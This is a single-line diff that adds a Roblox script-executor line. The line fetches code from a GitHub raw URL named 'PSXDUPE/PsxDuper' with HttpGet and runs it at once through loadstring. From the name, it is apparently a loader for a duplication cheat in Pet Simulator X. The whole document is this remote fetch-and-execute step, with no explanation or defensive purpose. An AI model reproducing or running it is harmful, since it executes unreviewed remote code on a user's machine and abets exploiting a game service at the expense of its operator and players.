@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FAHD-DEV/PSXDUPE/main/PsxDuper", true))()
